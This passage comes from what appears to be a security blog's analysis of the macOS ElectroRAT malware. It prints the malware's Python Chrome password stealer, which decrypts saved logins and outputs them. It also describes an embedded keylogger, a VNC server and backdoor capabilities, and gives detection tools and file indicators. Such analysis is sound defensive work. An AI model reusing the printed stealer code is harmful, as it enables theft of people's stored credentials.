</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124</span><span><span style="color:#e6db74">        :paran enc_passwd: encrypted password
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125</span><span><span style="color:#e6db74">        :return: decrypted password
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126</span><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127</span><span>        data <span style="color:#f92672">=</span> win32crypt<span style="color:#f92672">.</span>CryptUnprotectData(enc_passwd, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128</span><span>        <span style="color:#66d9ef">return</span> data[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130</span><span>    <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_login_db</span>(self):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132</span><span>        <span style="color:#e6db74">&#34;&#34;&#34; getting &#34;Login Data&#34; sqlite database path &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133</span><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>dbpath
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_pass</span>(self, prettyprint<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136</span><span>        <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137</span><span><span style="color:#e6db74">        Getting URL, username and password in clear text
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138</span><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139</span><span><span style="color:#e6db74">        :param prettyprint: if it is True, output dictionary will be
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140</span><span><span style="color:#e6db74">                            printed on the screen
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141</span><span><span style="color:#e6db74">        :return: clear text data in dictionary format
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142</span><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143</span><span>        copy(self<span style="color:#f92672">.</span>dbpath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;Login Data&#39;</span>, <span style="color:#e6db74">&#39;Login Data.db&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144</span><span>        conn <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;Login Data.db&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145</span><span>        cursor <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146</span><span>        cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;SELECT action_url, username_value, password_value</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">                        FROM logins&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147</span><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;data&#39;</span>: []}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148</span><span>        <span style="color:#66d9ef">for</span> result <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>fetchall():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149</span><span>            _passwd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>decrypt_func(result[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150</span><span>            passwd <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>join(i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> _passwd <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151</span><span>            <span style="color:#66d9ef">if</span> result[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">or</span> passwd:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152</span><span>                _data <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153</span><span>                _data[<span style="color:#e6db74">&#39;url&#39;</span>] <span style="color:#f92672">=</span> result[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154</span><span>                _data[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> result[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155</span><span>                _data[<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">=</span> passwd
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156</span><span>                data[<span style="color:#e6db74">&#39;data&#39;</span>]<span style="color:#f92672">.</span>append(_data)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158</span><span>        conn<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159</span><span>        unlink(<span style="color:#e6db74">&#39;Login Data.db&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160</span><span>        <span style="color:#66d9ef">if</span> prettyprint:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161</span><span>            print json<span style="color:#f92672">.</span>dumps(data, indent<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162</span><span>        <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166</span><span>    <span style="color:#e6db74">&#34;&#34;&#34; Operational Script &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167</span><span>    chrome_pwd <span style="color:#f92672">=</span> ChromePasswd()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168</span><span>    chrome_pwd<span style="color:#f92672">.</span>get_pass(prettyprint<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171</span><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172</span><span>    main()</span></span></code></pre></div>
<br>
&hellip;looks like a Chrome password stealer!</p>
</li>
<li>
<p><code>darwinKeylogger</code> (<code>SHA1: 3bcbfc40371c8d96f94b5a5d7c83264d22b0f57b</code>):<br><br>
This binary appears to be a basic macOS keylogger based on the open-source <a href="https://github.com/SkrewEverything/Swift-Keylogger/blob/master/Keylogger/Keylogger/Keylogger.swift">Swift-Keylogger</a> project (that (ab)uses <code>IOHIDManagerCreate</code> / <code>IOHIDManagerRegisterInputValueCallback</code>).
<br><br>
Note that on recent versions of macOS, this requires explicit user approval:<br><br>
<img src="../images/blog/blog_0x61/keylogger.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">built-in capabilities</center>
</p>
</li>
<li>
<p><code>darwinVnc</code> (<code>SHA1: 872da05c137e69617e16992146ebc08da3a9f58f</code>):<br><br>
This binary appears to the well known <a href="https://github.com/stweil/OSXvnc"><code>OSXvnc</code></a>, a &ldquo;<em>robust, full-featured VNC server for MacOS X</em>&rdquo;:
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
./darwinVnc -h

Available options:

-rfbport port          TCP port for RFB protocol (0=autodetect first open port 5900-5909)
-rfbwait time          Maximum time in ms to wait for RFB client
-rfbnoauth             Run the server without password protection
-rfbauth passwordFile  Use this password file for VNC authentication
                       (use 'storepasswd' to create a password file)
-rfbpass               Supply a password directly to the server

...
</pre>
</div></p>
</li>
</ul>
<br>
The malware also supports a variety of built-in standard backdoor capabilities ...such command execution, file upload/download and more
<img src="../images/blog/blog_0x61/capabilities.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">built-in capabilities</center>

<p><a href="https://twitter.com/AbbyMCH">Avigayil</a> sums this up well:</p>
<blockquote>
  "<i>ElectroRAT is extremely intrusive.
    <br>
    <br>
    ...it has various capabilities such as keylogging, downloading files and executing commands on the victim's console.</i>"
</blockquote>
<h3 id="detections">Detection(s)</h3>
<p>Good news, though this malware is brand new, several of our free (open-source) macOS security tools readily can detect and alert on it&rsquo;s malicious behaviors.</p>
<p>For example, when <code>OSX.ElectroRAT</code> persists, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> can alert you of this fact:</p>
<img src="../images/blog/blog_0x61/bb.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock: unauthorized persistence</center>

<p>&hellip;while our firewall, <a href="https://objective-see.com/products/LuLu.html">LuLu</a> will block and alert on the malware&rsquo;s unauthorized network connections:</p>
<img src="../images/blog/blog_0x61/lulu.png"  width="95%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">LuLu: unauthorized network connection</center>

<p>In terms of static IOCs, the presences of the following files may indicated an <code>OSX.ElectroRAT</code> infection:</p>
<ul>
<li><code>~/.mdworker</code></li>
<li><code>~/Library/LaunchAgents/mdworker.plist</code></li>
</ul>
<h3 id="conclusions">Conclusions</h3>
<p>Looks like 2021 will be another year filled with Mac malware!</p>
<p>In this blog post, we analyzed the new;y discovered <code>ElectroRAT</code>. Focusing on the macOS version, we detailed its:</p>
<ul>
<li>Launch agent persistence</li>
<li>Extracted and triaged its embedded binaries</li>
<li>&hellip; and discussed its built-in capabilities.
<br></li>
</ul>
<h3 id="-the-art-of-mac-malware">📚 The Art of Mac Malware</h3>
<p>If this blog posts pique your interest, definitely check out my new book on the topic of Mac Malware Analysis: &ldquo;<a href="https://taomm.org">The Art Of Mac Malware: Analysis</a>&rdquo;. It&rsquo;s free online, and new content is regularly added!</p>
<h3 id="-support-us">💕 Support Us:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>